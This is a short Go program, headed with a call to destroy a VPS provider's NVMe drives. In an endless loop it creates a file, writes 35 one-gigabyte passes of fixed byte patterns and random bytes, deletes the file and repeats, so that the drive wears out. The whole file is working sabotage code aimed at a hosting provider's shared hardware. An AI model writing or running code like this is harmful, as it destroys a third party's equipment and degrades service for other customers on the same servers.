// DESTROY YOUR LOCAL VPS PROVIDERS NVMe's
package main

import (
	"log"
	"os"
	"math/rand"
)

const (
	fileName = "fuckfile.dat"
	fileSize = 1 << 30 // 1 GB
)

var gutmannPatterns = []byte{
	0x55, 0xAA, 0x92, 0x49, 0x24, 0x00, 0xFF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
	0x92, 0x49, 0x24, 0x55, 0xAA, 0x00, 0xFF, 0x44, 0x55, 0xAA, 0x92, 0x49, 0x24, 0x00, 0xFF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x92, 0x49, 0x24, 0x55, 0xAA, 0x92, 0x49, 0x24, 0x00, 0xFF,
}

func createFile() *os.File {
	f, err := os.Create(fileName)
	if err != nil {
		log.Fatalf("Error creating file: %v", err)
	}
	return f
}

func writeFile(f *os.File, data []byte) {
	_, err := f.Write(data)
	if err != nil {
		log.Fatalf("Error writing to file: %v", err)
	}
}

func main() {
	for {
		f := createFile()

		for i := 0; i < 35; i++ {
			if i < len(gutmannPatterns) {
				data := make([]byte, fileSize, fileSize)
				for j := range data {
					data[j] = gutmannPatterns[i]
				}
				writeFile(f, data)
			} else {
				data := make([]byte, fileSize, fileSize)
				for j := range data {
					data[j] = byte(rand.Intn(256))
				}
				writeFile(f, data)
			}
			f.Seek(0, 0) // Reset file pointer to start
		}

		f.Close()

		err := os.Remove(fileName)
		if err != nil {
			log.Fatalf("Error deleting file: %v", err)
		}
	}
}
